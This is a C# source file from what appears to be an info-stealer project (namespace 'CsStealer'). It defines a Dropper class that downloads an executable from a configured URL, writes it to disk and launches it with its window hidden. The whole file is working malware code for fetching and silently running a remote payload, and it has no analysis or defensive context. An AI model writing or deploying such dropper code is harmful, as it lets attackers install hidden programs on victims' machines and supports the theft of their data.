using System;
using System.Net.Http;
using System.Diagnostics;

namespace CsStealer
{
    class Dropper
    {
        public static async Task Drop()
        {
            string url = Config.ExecutableToDropURL;
            string DistPath = Config.ExecutableToDropDistPath;
                
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    byte[] Content = await client.GetByteArrayAsync(url);
                    File.WriteAllBytes(DistPath, Content);
                }

                Process Initer = new Process();

                Initer.StartInfo.FileName = DistPath;
                Initer.StartInfo.CreateNoWindow = true;
                Initer.Start();
            }
            catch
            {
                Debugger.Debug("ERROR", $"Couldn't drop the file in {DistPath}");
            }
        }
    }

}
